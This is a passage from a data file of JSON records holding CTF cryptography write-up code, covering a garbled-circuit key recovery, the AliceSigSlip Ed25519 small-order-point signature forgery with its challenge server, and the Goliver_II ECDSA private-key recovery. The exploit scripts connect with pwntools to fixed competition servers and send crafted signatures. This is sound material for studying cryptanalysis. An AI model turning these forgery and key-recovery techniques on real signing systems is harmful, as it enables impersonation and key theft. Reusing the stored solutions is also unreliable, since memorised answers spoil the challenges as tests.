all_wires[input2] is None:\n            continue\n        if all_wires[output] is not None:\n            if all_wires[input1] in F2 and all_wires[input2] in F2 and all_wires[output] in F2:\n                assert all_wires[input1] + all_wires[input2] == all_wires[output]\n                continue\n            print(f\"XOR Equation {i}: {all_wires[input1]} + {all_wires[input2]} = {all_wires[output]}\")\n            eqs.append(all_wires[input1] + all_wires[input2] - all_wires[output])\n        else:\n            all_wires[output] = all_wires[input1] + all_wires[input2]\n    elif ops[-1] == \"INV\":\n        assert len(ops) == 5\n        input1 = int(ops[2])\n        output = int(ops[3])\n        if all_wires[input1] is None:\n            continue\n        if all_wires[output] is not None:\n            # discard trivial solutions\n            if all_wires[input1] in F2 and all_wires[output] in F2:\n                assert all_wires[input1] == F2(1) + all_wires[output]\n                continue\n            print(f\"INV Equation {i}: {all_wires[input1]} = {1 + all_wires[output]}\")\n            eqs.append(all_wires[input1] - F2(1) - all_wires[output])\n        else:\n            all_wires[output] = F2(1) + all_wires[input1]\n    elif ops[-1] == \"AND\":\n        assert len(ops) == 6\n        input1 = int(ops[2])\n        input2 = int(ops[3])\n        output = int(ops[4])\n        if all_wires[input1] is None:\n            continue\n        if all_wires[input2] is None:\n            continue\n        # print(\"AND\", all_wires[input1], all_wires[input2])\n        if all_wires[output] is not None:\n            if all_wires[input1] in F2 and all_wires[input2] in F2 and all_wires[output] in F2:\n                assert all_wires[input1] * all_wires[input2] == all_wires[output]\n                continue\n            if all_wires[input1] in F2 or all_wires[input2] in F2:\n                print(f\"AND Equation {i}: {all_wires[input1]} * {all_wires[input2]} = {all_wires[output]}\")\n                eqs.append(all_wires[input1] * all_wires[input2] - all_wires[output])\n        # not add AND info to make all eqs linear\n        else:\n            if all_wires[input1] in F2 or all_wires[input2] in F2:\n                all_wires[output] = all_wires[input1] * all_wires[input2]\n    else:\n        print(ops)\n        break\n\nprint(len(eqs))\nseq = Sequence(eqs)\nmat, mono = seq.coefficients_monomials()\nprint(seq.nvariables())\nprint(seq.variables())\nassert mat.rank() == seq.nvariables(), \"rank not equal to nvariables, sol not unique\"\nbasis = mat.right_kernel().basis()\nassert len(basis) == 1\nsol = basis[0]\nassert sol[-1] == 1 and mono[-1] == 1\nunknown_vars = [xi for xi in xlist if xi not in seq.variables()]\nunknown_nvar = len(unknown_vars)\nsol_dict = {xi:b for xi, b in zip(mono[:-1], sol[:-1])}\n\nfor i in range(2**unknown_nvar):\n    for j, xi in enumerate(unknown_vars):\n        sol_dict[xi] = (i >> j) & 1\n    key_bin_str = \"\".join([str(sol_dict[xi]) for xi in xlist])\n    key_bytes = int(key_bin_str, 2).to_bytes(16, byteorder='big')\n    cipher = AES.new(key_bytes, AES.MODE_ECB)\n    flag = cipher.decrypt(flag_enc)\n    print(flag)", "name": "local_solve"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\DiceCTF\\nic-cir\\demo\\block_cipher.py", "category": "crypto", "solution_code": "SBoxes = [[15, 1, 7, 0, 9, 6, 2, 14, 11, 8, 5, 3, 12, 13, 4, 10], [3, 7, 8, 9, 11, 0, 15, 13, 4, 1, 10, 2, 14, 6, 12, 5], [4, 12, 9, 8, 5, 13, 11, 7, 6, 3, 10, 14, 15, 1, 2, 0], [2, 4, 10, 5, 7, 13, 1, 15, 0, 11, 3, 12, 14, 9, 8, 6], [3, 8, 0, 2, 13, 14, 5, 11, 9, 1, 7, 12, 4, 6, 10, 15], [14, 12, 7, 0, 11, 4, 13, 15, 10, 3, 8, 9, 2, 6, 1, 5]]\n\nSInvBoxes = [[3, 1, 6, 11, 14, 10, 5, 2, 9, 4, 15, 8, 12, 13, 7, 0], [5, 9, 11, 0, 8, 15, 13, 1, 2, 3, 10, 4, 14, 7, 12, 6], [15, 13, 14, 9, 0, 4, 8, 7, 3, 2, 10, 6, 1, 5, 11, 12], [8, 6, 0, 10, 1, 3, 15, 4, 14, 13, 2, 9, 11, 5, 12, 7], [2, 9, 3, 0, 12, 6, 13, 10, 1, 8, 14, 7, 11, 4, 5, 15], [3, 14, 12, 9, 5, 15, 13, 2, 10, 11, 8, 4, 1, 6, 0, 7]]\n\ndef S(block, SBoxes):\n    output = 0\n    for i in range(0, len(SBoxes)):\n        output |= SBoxes[i][(block >> 4*i) & 0b1111] << 4*i\n\n    return output\n\nPBox = [15, 22, 11, 20, 16, 8, 2, 3, 14, 19, 18, 1, 12, 4, 9, 13, 23, 21, 10, 17, 0, 5, 6, 7]\nPInvBox = [20, 11, 6, 7, 13, 21, 22, 23, 5, 14, 18, 2, 12, 15, 8, 0, 4, 19, 10, 9, 3, 17, 1, 16]\n\n\ndef permute(block, pbox):\n    output = 0\n    for i in range(24):\n        bit = (block >> pbox[i]) & 1\n        output |= (bit << i)\n    return output\n\ndef encrypt_data(block, key):\n\n    for j in range(0, 3):\n        \n        block ^= key\n        block = S(block, SBoxes)\n        block = permute(block, PBox)\n\n    block ^= key\n\n    return block\n\n\ndef decrypt_data(block, key):\n    block ^= key\n    for j in range(0, 3):\n        block = permute(block, PInvBox)\n        block = S(block, SInvBoxes)\n        block ^= key\n    return block\n\n\ndef encrypt(data, key1, key2):\n    encrypted = encrypt_data(data, key1)\n    encrypted = encrypt_data(encrypted, key2)\n    return encrypted\n\n\ndef decrypt(data, key1, key2):\n    decrypted = decrypt_data(data, key2)\n    decrypted = decrypt_data(decrypted, key1)\n    return decrypted", "name": "block_cipher"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\DiceCTF\\nic-cir\\demo\\evaluate_example.py", "category": "crypto", "solution_code": "from block_cipher import decrypt\nfrom yao_circuit import GarbledGate as Ggate\nimport json\n\n# garbled truth tables\nG_Table = {\n    5: [(6829921, 11451673), (1515696, 6333149), (15107502, 8186257), (5872557, 12241756)], \n    6: [(13415489, 4332242), (5144037, 9578022), (15201634, 13202380), (10357348, 15158424)], \n    7: [(1587462, 6581034), (8356378, 2216472), (11762280, 3875959), (5982650, 7776773)], \n    9: [(5728291, 11896856), (12052243, 1282564), (10228672, 10487067), (6137078, 8217550)]\n    }\n\n# Note that this keys table belongs to Alice.\n# The values at index positions 0 and 1 of the tuple correspond to the labels for input bits 0 and 1, respectively.\n# keys = {1: (15233817, 1315943), \n#         2: (15274501, 5158879), \n#         3: (7431802, 16682547), \n#         4: (11945610, 6753699), \n#         5: (13849459, 4637545), \n#         6: (10453495, 2479542), \n#         7: (2068375, 13039971), \n#         9: (7508273, 12723289)}\n\n# Bob gets the wires\n# alice_input = (keys[1][1],keys[2][0])\n# bob_input = (keys[3][1],keys[4][1])\nalice_input = (1315943 ,15274501)\nbob_input = (16682547, 6753699)\n\n# load circuit\ncircuit_filename = \"circuit_map.json\"\nwith open(circuit_filename) as json_file:\n    circuit = json.load(json_file)\n\n# evaluate the truth_table given the two input labels\ndef validate_the_circuit(geta_table, key0, key1):\n    for g in geta_table:\n        gl, v = g\n        label = decrypt(gl, key0, key1)\n        validation = decrypt(v, key0, key1)\n\n        if validation == 0:\n            return label\n        \nlabels_dict = {}\nuser_input = {1: alice_input[0], 2: alice_input[1], 3: bob_input[0], 4: bob_input[1]}\ngates = circuit[\"gates\"]\nwires = set()\nfor gate in gates:\n    wires.add(gate[\"id\"])\n    wires.update(set(gate[\"in\"]))\nfor wireidx in wires:\n    # the index of keys[wireidx] 1 and 0 means TRUE and FALSE in garbled circuit\n    if wireidx in user_input:\n        labels_dict[wireidx] = user_input[wireidx]\n    else:\n        labels_dict[wireidx] = -1\n\nwhile True:\n    for gate in gates:\n        out_id = gate[\"id\"]\n        input = gate[\"in\"]\n        \n        if labels_dict[input[0]] == -1 or labels_dict[input[1]] == -1:\n            continue\n        else:\n            garbled_table = G_Table[out_id]\n            key0 = labels_dict[input[0]]\n            key1 = labels_dict[input[1]]\n            labels_dict[out_id] = validate_the_circuit(garbled_table, key0, key1)\n    target = circuit[\"out\"][0]\n    if labels_dict[target] != -1:\n        print(\"The target label is: \", labels_dict[target])\n        break", "name": "evaluate_example"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\DiceCTF\\nic-cir\\demo\\gen_key.py", "category": "crypto", "solution_code": "import json\nfrom block_cipher import decrypt\n\nfrom random import randrange\nfrom yao_circuit import GarbledGate as Ggate\n\nflag = b'****************'\n\n\ncircuit_filename = \"circuit_map.json\"\nwith open(circuit_filename) as json_file:\n    circuit = json.load(json_file)\n\ndef init_keys(circuit):\n    keys = {}\n    gates          = circuit[\"gates\"] \n    wires          = set()\n    for gate in gates:\n        wires.add(gate[\"id\"])\n        wires.update(set(gate[\"in\"]))\n    for wireidx in wires:\n        # the index of keys[wireidx] 1 and 0 means TRUE and FALSE in garbled circuit\n        keys[wireidx] = (randrange(0, 2**24),randrange(0, 2**24))\n    return keys\n                    \ndef validate_the_circuit(geta_table, key0, key1):\n    for g in geta_table:\n        gl, v = g\n        label = decrypt(gl, key0, key1)\n        validation = decrypt(v, key0, key1)\n        \n        if validation == 0:\n            return label            \n            \ndef init_garbled_tables(circuit,keys):\n    gates = circuit[\"gates\"]\n    garbled_tables = {}\n    for gate in gates:\n        garbled_table = Ggate(gate, keys)\n        garbled_tables[gate[\"id\"]] = garbled_table\n    return garbled_tables\n\n\nkeys = init_keys(circuit)\nprint(keys)\n# exit()\nG_Table = init_garbled_tables(circuit,keys)\n# ic(keys)\n# ic(G_Table)\n\n# hint\n# circuit wiring has only one situation mack ASSERT be true\ngeta_table = G_Table[9]\nkey0 = keys[7][1]\nkey1 = keys[4][0]\nmsg = validate_the_circuit(geta_table, key0, key1)\n\nassert msg == keys[circuit[\"out\"][0]][1]\n# \n\n# with open(\"public_data.py\",\"r+\") as f:\n#     print(\"G_Table = {}\".format(G_Table),file=f)\n    \n# with open(\"private_data.py\",\"r+\") as f:\n#     print(\"keys = {}\".format(keys),file=f)\n#     print(\"flag = {}\".format(str(flag)),file=f)", "name": "gen_key"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\DiceCTF\\nic-cir\\demo\\yao_circuit.py", "category": "crypto", "solution_code": "from random import shuffle, randrange\n\n\nfrom block_cipher import encrypt, decrypt\n\ndef garble_label(key0, key1, key2):\n    \"\"\"\n    key0, key1 = two input labels\n    key2 = output label\n    \"\"\"\n    gl = encrypt(key2, key0, key1)\n    validation = encrypt(0, key0, key1)\n    return (gl, validation)\n\n\ndef GarbledGate( gate, keys): # init g data\n    input               = gate[\"in\"]\n    output              = gate[\"id\"] \n    gate_type           = gate[\"type\"]\n    labels0 = keys[input[0]]\n    labels1 = keys[input[1]]\n    labels2 = keys[output]\n    if gate_type == \"AND\":\n        garbled_table = AND_gate(labels0, labels1, labels2)\n    if gate_type == \"XOR\":\n        garbled_table = XOR_gate(labels0, labels1, labels2)\n    return garbled_table\n        \n        \ndef AND_gate( labels0, labels1, labels2):\n    \"\"\"\n    labels0, labels1 = two input labels\n    labels2 = output label\n    \"\"\"\n    key0_0, key0_1 = labels0\n    key1_0, key1_1 = labels1\n    key2_0, key2_1 = labels2\n    \n    G = []\n    G.append(garble_label(key0_0, key1_0, key2_0))\n    G.append(garble_label(key0_0, key1_1, key2_0))\n    G.append(garble_label(key0_1, key1_0, key2_0))\n    G.append(garble_label(key0_1, key1_1, key2_1))\n    shuffle(G)\n    \n    return G\n\ndef XOR_gate( labels0, labels1, labels2):\n    key0_0, key0_1 = labels0\n    key1_0, key1_1 = labels1\n    key2_0, key2_1 = labels2\n    \n    G = []\n    G.append(garble_label(key0_0, key1_0, key2_0))\n    G.append(garble_label(key0_0, key1_1, key2_1))\n    G.append(garble_label(key0_1, key1_0, key2_1))\n    G.append(garble_label(key0_1, key1_1, key2_0))\n    shuffle(G)\n    \n    return G\n\n\ndef garble_label(key0, key1, key2):\n    \"\"\"\n    key0, key1 = two input labels\n    key2 = output label\n    \"\"\"\n    gl = encrypt(key2, key0, key1)\n    validation = encrypt(0, key0, key1)\n    return (gl, validation)", "name": "yao_circuit"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\CryptoCTF\\AliceSigSlip\\AliceSigSlip.py", "category": "crypto", "solution_code": "#!/usr/bin/env python3\n\nimport sys\nfrom Crypto.PublicKey import ECC\nfrom Crypto.Signature import eddsa\n# from flag import flag\nflag = \"CCTF{example_flag}\"\n\ndef die(*args):\n\tpr(*args)\n\tquit()\n\ndef pr(*args):\n\ts = \" \".join(map(str, args))\n\tsys.stdout.write(s + \"\\n\")\n\tsys.stdout.flush()\n\ndef sc():\n\treturn sys.stdin.buffer.readline()\n\ndef init_data():\n\tglobal alice_data\n\n\talice_data = []\n\talice_key = ECC.generate(curve = \"ed25519\")\n\tsigner = eddsa.new(alice_key, \"rfc8032\")\n\tpublic_key = alice_key.public_key().export_key(format=\"raw\")\n\tfor msg in [\n\t\tb\"Alice cracks codes in her sleep.\",\n\t\tb\"Alice never leaves a cipher unsolved.\",\n\t\tb\"No flag for those who give up too soon, says Alice.\",\n\t\tb\"Alice never gives up; that's why she always gets the flag.\",\n\t\tb\"Alice loves solving ciphers, especially when they're tricky.\",\n\t]:\n\t\tsignature = signer.sign(msg)\n\t\talice_data.append((public_key, signature[:32], signature[32:], msg))\n\ndef erase():\n\tglobal alice_data\n\tfor i, row in enumerate(alice_data):\n\t\talice_data[i] = (b\"\",) * i + row[i:]\n\ndef alice_check():\n\tglobal alice_data\n\tfor public_key, r, s, msg in alice_data:\n\t\tif min(map(len, [public_key, r, s, msg])) == 0:\n\t\t\treturn False\n\t\tpublic_key = eddsa.import_public_key(encoded=public_key)\n\t\tif public_key.pointQ.x * public_key.pointQ.y == 0:\n\t\t\treturn False\n\t\tverifier = eddsa.new(public_key, \"rfc8032\")\n\t\ttry:\n\t\t\tverifier.verify(msg, r + s)\n\t\texcept ValueError:\n\t\t\tprint(\"Wrong sign\")\n\t\t\treturn False\n\treturn True\n\ndef main():\n\tborder = \"â”ƒ\"\n\tpr(\"â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”“\")\n\tpr(border, \"I accidentally triggered a function that erased part of Alice's data. \", border)\n\tpr(border, \"Can you help me recover it before she finds out?                      \", border)\n\tpr(\"â”—â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”›\")\n\t\n\tglobal alice_data\n\n\tinit_data()\n\terase()\n\n\twhile True:\n\t\tpr(\n\t\t\tf\"{border} Options: \\n{border}\\t[G]et data \\n{border}\\t[U]pdate data \\n{border}\\t[A]lice check \\n{border}\\t[Q]uit\"\n\t\t)\n\t\tans = sc().decode().strip().lower()\n\t\tif ans == \"g\":\n\t\t\tfor row_inx, row_val in enumerate(alice_data):\n\t\t\t\tpr(border, row_inx, \":\", \", \".join(map(bytes.hex, row_val)))\n\t\telif ans == \"u\":\n\t\t\tpr(border, \"row_inx, public_key, r, s, msg:\")\n\t\t\t_new_data = sc().decode()\n\t\t\ttry:\n\t\t\t\t_new_data = _new_data.split(\",\")\n\t\t\t\trow_inx = int(_new_data[0])\n\t\t\t\tpublic_key, r, s, msg = map(bytes.fromhex, _new_data[1:])\n\t\t\texcept:\n\t\t\t\tdie(border, \"Bad input! Quitting...\")\n\n\t\t\tnew_row = [public_key, r, s, msg]\n\t\t\tif 0 <= row_inx < len(alice_data) and all(\n\t\t\t\tlen(old_val) == 0 or new_val == old_val\n\t\t\t\tfor old_val, new_val in zip(alice_data[row_inx], new_row)\n\t\t\t):\n\t\t\t\talice_data[row_inx] = new_row\n\t\t\telse:\n\t\t\t\tdie(border, \"Bad input values! Quitting...\")\n\t\telif ans == \"a\":\n\t\t\tif alice_check():\n\t\t\t\tdie(border, f\"Hey Alice, everything seems fine here! Here's the {flag: }!\")\n\t\t\telse:\n\t\t\t\tdie(border,\t\"Uh-oh, Alice! Looks like the data went on vacation without telling anyone.\")\n\t\telif ans == \"q\":\n\t\t\tdie(border, \"Quitting...\")\n\t\telse:\n\t\t\tdie(border, \"Bye...\")\n\nif __name__ == \"__main__\":\n\tmain()", "name": "AliceSigSlip"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\CryptoCTF\\AliceSigSlip\\ed25519_weak_points.py", "category": "crypto", "solution_code": "from Crypto.Signature import eddsa\nfrom sage.all import GF, EllipticCurve, ZZ\n\np = 0x7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffed\nK = GF(p)\na = K(0x7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffec)\nd = K(0x52036cee2b6ffe738cc740797779e89800700a4d4141d8ab75eb4dca135978a3)\n\nE = EllipticCurve(K, (K(-ZZ(1)/ZZ(48)) * (a**2 + 14*a*d + d**2),K(ZZ(1)/ZZ(864)) * (a + d) * (-a**2 + 34*a*d - d**2)))\n\ndef to_weierstrass(a, d, x, y):\n\treturn ((5*a + a*y - 5*d*y - d)/(12 - 12*y), (a + a*y - d*y -d)/(4*x - 4*x*y))\n\ndef to_twistededwards(a, d, u, v):\n\ty = (5*a - 12*u - d)/(-12*u - a + 5*d)\n\tx = (a + a*y - d*y -d)/(4*v - 4*v*y)\n\treturn (x, y)\n\nG = E(*to_weierstrass(a, d, K(0x216936D3CD6E53FEC0A4E231FDD6DC5C692CC7609525A7B2C9562D608F25D51A), K(0x6666666666666666666666666666666666666666666666666666666666666658)))\n\nE.set_order(0x1000000000000000000000000000000014def9dea2f79cd65812631a5cf5d3ed * 0x08)\n\nprint(f\"{E = }\")\nprint(f\"{G = }\")\n# all points of order 8, i.e., 8 * G = O\ntorision_8 = E.zero().division_points(8)\nprint(f\"{torision_8 = }\")\ned_points = []\nfor point in torision_8:\n    if point[0] == 0 or point[1] == 0:\n        continue\n    ed_points.append(to_twistededwards(a, d, point[0], point[1]))\n\nprint(f\"{ed_points[2][1] = }\")\npk = bytearray(int(ed_points[2][1]).to_bytes(32, 'little'))\n# if not a valid point compression, flip the following bit\n# pk[31] = pk[31] ^ (1 >> 7)\n\npublic_key = eddsa.import_public_key(encoded=pk)\n# g = public_key._curve.G\n# print(f\"{g.xy = }\")\nprint(\"Public Key:\", public_key)\nQ = 8 * public_key.pointQ\nprint(f\"{(8 * public_key.pointQ).xy = }\")", "name": "ed25519_weak_points"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\CryptoCTF\\AliceSigSlip\\exp.py", "category": "crypto", "solution_code": "from pwn import * \nfrom Crypto.Util.number import *\nfrom Crypto.Signature import eddsa\nfrom Crypto.PublicKey import ECC\nfrom Crypto.Hash import SHA512, SHAKE256\nfrom Crypto.PublicKey.ECC import (EccKey,\n                                  construct,\n                                  _import_ed25519_public_key,\n                                  _import_ed448_public_key)\n\nfrom Crypto.Math.Numbers import Integer\n_order = 7237005577332262213973186563042994240857116359379907606001950938285454250989\n\ndef get_data(io):\n    io.recvuntil(b\"uit\\n\")\n    io.sendline(b\"g\")\n    datas = [[None,None,None,None] for i in range(4)]\n    io.recvuntil(b\"0 : \")\n    datas[0][0] = bytes.fromhex(io.recvuntil(b',')[:-1].decode())\n    datas[0][1] = bytes.fromhex(io.recvuntil(b',')[:-1].decode())\n    datas[0][2] = bytes.fromhex(io.recvuntil(b',')[:-1].decode())\n    datas[0][3] = bytes.fromhex(io.recvuntil(b'\\n')[:-1].decode())\n    io.recvuntil(b\"1 : , \") \n    datas[1][1] = bytes.fromhex(io.recvuntil(b',')[:-1].decode())\n    datas[1][2] = bytes.fromhex(io.recvuntil(b',')[:-1].decode())\n    datas[1][3] = bytes.fromhex(io.recvuntil(b'\\n')[:-1].decode())\n    io.recvuntil(b\"2 : , , \")  \n    datas[2][2] = bytes.fromhex(io.recvuntil(b',')[:-1].decode())\n    datas[2][3] = bytes.fromhex(io.recvuntil(b'\\n')[:-1].decode())\n    io.recvuntil(b\"3 : , , , \")   \n    datas[3][3] = bytes.fromhex(io.recvuntil(b'\\n')[:-1].decode())\n    return datas\n\n# context.log_level = 'debug'\n# nc 91.107.133.165 13777\n# io = process([\"python3\", 'AliceSigSlip.py'])\nio = remote(\"91.107.133.165\", 13777)\ndatas = get_data(io)\npk = datas[0][0]\npublic_key = eddsa.import_public_key(encoded=pk)\n_A = public_key._export_eddsa_public()\nm1 = datas[0][3] \nR1,s1 = datas[0][1],datas[0][2] \nk_hash1 = SHA512.new(R1 + _A + m1).digest()\nk1 = Integer.from_bytes(k_hash1, 'little') % _order\n\n# update idx 1\nm2 = datas[1][3]\nR2,s2 = datas[1][1],datas[1][2]\nk_hash2 = SHA512.new(R2 + _A + m2).digest()\nk2 = Integer.from_bytes(k_hash2, 'little') % _order\nio.recvuntil(b\"uit\\n\")\nio.sendline(b\"u\")\nio.recvuntil(b\"row_inx, public_key, r, s, msg:\")\nio.sendline(f\"1,{pk.hex()},{R2.hex()},{s2.hex()},{m2.hex()}\".encode())\n\n# s * k = h + r * d\n# io.interactive()\n# update idx 2\nmsg3 = b\"No flag for those who give up too soon, says Alice.\"\nd = 13456\norder_8_Q_y = 55188659117513257062467267217118295137698188065244968500265048394206261417927\npk = bytearray(int(order_8_Q_y).to_bytes(32, 'little'))\npublic_key = eddsa.import_public_key(encoded=pk)\nQ = 8 * public_key.pointQ\nassert Q.x == 0 and Q.y == 1, \"The public key does not correspond to a point of order 8.\"\nm3 = datas[2][3]\nassert m3 == msg3, \"The message does not match the expected value.\"\nR3, S3 = datas[2][1], datas[2][2]\ns3 = Integer.from_bytes(S3, 'little') \nprint(f\"target {R3 = }\")\nprint(f\"target {s3 = }\")\n\npoint1 = (s3 * 8) * public_key._curve.G\nprint(f\"target {point1.xy = }\")\npoint_R = pow(8, -1, _order) * point1\nprint(f\"target {point_R.xy = }\")\nR3 = EccKey(point=point_R)._export_eddsa_public()\nalice_data = (2, public_key._export_eddsa_public(), R3, S3, m3)\nio.recvuntil(b\"uit\\n\")\nio.sendline(b\"u\")\nio.recvuntil(b\"row_inx, public_key, r, s, msg:\")\nio.sendline(f\"{alice_data[0]},{alice_data[1].hex()},{alice_data[2].hex()},{alice_data[3].hex()},{alice_data[4].hex()}\".encode())\n\n\n\n# update idx 3\nalice_key = ECC.generate(curve = \"ed25519\")\napk = alice_key.public_key().export_key(format=\"raw\")\nsigner = eddsa.new(alice_key, \"rfc8032\")\nm4 = b\"Alice never gives up; that's why she always gets the flag.\"\nsigns = signer.sign(m4)\nalice_data = (3, apk, signs[:32], signs[32:], m4)\nio.recvuntil(b\"uit\\n\")\nio.sendline(b\"u\")\nio.recvuntil(b\"row_inx, public_key, r, s, msg:\")\nio.sendline(f\"{alice_data[0]},{alice_data[1].hex()},{alice_data[2].hex()},{alice_data[3].hex()},{alice_data[4].hex()}\".encode())\n\n# update idx 4\nm4 = b\"Alice loves solving ciphers, especially when they're tricky.\"\nsigns =signer.sign(m4)\nalice_data = (4, apk, signs[:32], signs[32:], m4)\nio.recvuntil(b\"uit\\n\")\nio.sendline(b\"u\")\nio.recvuntil(b\"row_inx, public_key, r, s, msg:\")\nio.sendline(f\"{alice_data[0]},{alice_data[1].hex()},{alice_data[2].hex()},{alice_data[3].hex()},{alice_data[4].hex()}\".encode())\n\n# ===========\nio.recvuntil(b\"uit\\n\")\nio.sendline(b\"a\")\nio.interactive()", "name": "exp"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\CryptoCTF\\Goliver_II\\exp.py", "category": "crypto", "solution_code": "from sage.all import EllipticCurve, GF, ZZ\n# nc 91.107.252.0 17733\nfrom pwn import remote, context, log, process\nfrom sage.all import PolynomialRing, Zmod, Ideal\nfrom hashlib import sha256\nfrom Crypto.Util.number import long_to_bytes\n\np = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F\na, b = 0, 7\nn = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141\nx = 0x4F22E22228BD75086D77AE65174C000F132BFD4EF3E28BEF20AC476997D4444F\ny = 0x3456B224247A4F73BF187AC25864F8F694C078380E6BDDF51379AC33F18BD829\nG = (x, y)\n\n\nE = EllipticCurve(GF(p), [a, b])\nG = E(G[0], G[1])\nprint(\"Curve:\", E)\nprint(\"Generator:\", G)\nprint(G.order())\n\ndef sign(sign_id, io: remote):\n    io.sendlineafter(b\"[Q]uit\\n\", b\"s\")\n    io.sendlineafter(b\"sign_id:\\n\", str(sign_id).encode())\n    res = io.recvline().decode().strip().split(\"s = \")[1]\n    return int(res)\n\ndef get_pubkey(io:remote):\n    io.sendlineafter(b\"[Q]uit\\n\", b\"p\")\n    res = io.recvline().decode().strip().split(\"pubkey = \")[1]\n    return eval(res)\n\ndef get_clean_eqs():\n    # r0 = fG.x\n    # r1 = (f+1)G.x\n    # r2 = (f-1)G.x\n    # s * (si + f) = (hm + r*sk)\n    # s0*f = (hm + r0*sk0)\n    # s1*f = (hm + r0*sk1)\n    # (s1 - s0) f = r0(sk1 - sk0)\n    # (s2 - s0) f = r0(sk2 - sk0)\n    n_sample = 4\n    pr = PolynomialRing(GF(n), [\"sk0\", \"sk1\", \"sk2\", \"sk3\", \"f\", \"hm\", \"r0\", \"r1\", \"r2\"])\n    sk0, sk1, sk2, sk3, f, hm, r0, r1, r2 = pr.gens()\n    sks = [sk0, sk1, sk2, sk3]\n    polys = []\n    for i in range(n_sample):\n        io = remote(\"91.107.252.0\", 17733)\n        pk = get_pubkey(io)\n        print(\"Public Key:\", pk)\n        s0 = sign(n + 0, io)\n        s1 = sign(1, io)\n        s2 = sign(n - 1, io)\n        polys.extend(\n            [s0 * f - (hm + r0 * sks[i]),\n            s1 * (f + 1) - (hm + r1 * sks[i]),\n            s2 * (f - 1) - (hm + r2 * sks[i])]\n        )\n        io.close()\n    I = Ideal(polys)\n    basis = I.groebner_basis()\n    print(f\"{basis = }\")\n\n\nio = remote(\"91.107.252.0\", 17733)\npk = get_pubkey(io)\nprint(\"Public Key:\", pk)\ns0 = sign(n + 0, io)\n# s0 * f = (hm + r0*sk0)\nflag_half = b'CCTF{!_4m_A_9!an7_am0nG'\nhm = int.from_bytes(sha256(flag_half).digest(), \"big\")\nk = n + int.from_bytes(flag_half, \"big\")\nr0 = (k * G)[0]\nsk = int((s0 * k - hm) * pow(int(r0), -1, n) % n)\n\nio.sendlineafter(b\"[Q]uit\\n\", b\"g\")\nio.sendlineafter(b\"private key: \\n\", str(sk).encode())\nio.interactive()", "name": "exp"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\CryptoCTF\\Goliver_II\\exp_half_flag.py", "category": "crypto", "solution_code": "from sage.all import EllipticCurve, GF, ZZ\n# nc 91.107.252.0 17733\nfrom pwn import remote, context, log, process\nfrom sage.all import PolynomialRing, Zmod, Ideal\nfrom sage.all import solve\nfrom sage.rings.polynomial.msolve import variety\nfrom sage.rings.polynomial import multi_polynomial_ideal\n\n\np = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F\na, b = 0, 7\nn = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141\nx = 0x4F22E22228BD75086D77AE65174C000F132BFD4EF3E28BEF20AC476997D4444F\ny = 0x3456B224247A4F73BF187AC25864F8F694C078380E6BDDF51379AC33F18BD829\nG = (x, y)\n\n\nE = EllipticCurve(GF(p), [a, b])\nG = E(G[0], G[1])\nprint(\"Curve:\", E)\nprint(\"Generator:\", G)\nprint(G.order())\n\ndef sign(sign_id, io: remote):\n    io.sendlineafter(b\"[Q]uit\\n\", b\"s\")\n    io.sendlineafter(b\"sign_id:\\n\", str(sign_id).encode())\n    res = io.recvline().decode().strip().split(\"s = \")[1]\n    return int(res)\n\ndef get_pubkey(io:remote):\n    io.sendlineafter(b\"[Q]uit\\n\", b\"p\")\n    res = io.recvline().decode().strip().split(\"pubkey = \")[1]\n    return eval(res)\n\n# r0 = fG.x\n# r1 = (f+1)G.x\n# r2 = (f-1)G.x\n# s * (si + f) = (hm + r*sk)\n# s0*f = (hm + r0*sk0)\n# s1*f = (hm + r0*sk1)\n# (s1 - s0) f = r0(sk1 - sk0)\n# (s2 - s0) f = r0(sk2 - sk0)\n\nn_sample = 3\npr = PolynomialRing(GF(n), [\"sk0\", \"sk1\", \"sk2\", \"f\", \"hm\", \"r0\", \"r1\", \"r2\"])\nsk0, sk1, sk2, f, hm, r0, r1, r2 = pr.gens()\nvariables = pr.gens()\nsks = [sk0, sk1, sk2]\npolys = []\nfor i in range(n_sample):\n    # io = remote(\"91.107.252.0\", 17733)\n    io = process([\"python3\", \"goliver_ii.py\"])\n    pk = get_pubkey(io)\n    print(\"Public Key:\", pk)\n    s0 = sign(n + 0, io)\n    s1 = sign(1, io)\n    s2 = sign(n - 1, io)\n    polys.extend(\n        [s0 * f - (hm + r0 * sks[i]),\n         s1 * (f + 1) - (hm + r1 * sks[i]),\n         s2 * (f - 1) - (hm + r2 * sks[i])]\n    )\n    io.close()\n\nI = Ideal(polys)\n# solu = I.variety(proof=False)\n# solu = solve(polys, *variables, algorithm=\"msolve\")\n# print(f\"Solutions: {solu = }\")\n\nbasis = I.groebner_basis()\nprint(\"Groebner Basis:\")\nfor b in basis:\n    print(b)\n    \n# then solve the system of equations, idk why I.variety() does not work in this case (maybe because there are too two solutions)", "name": 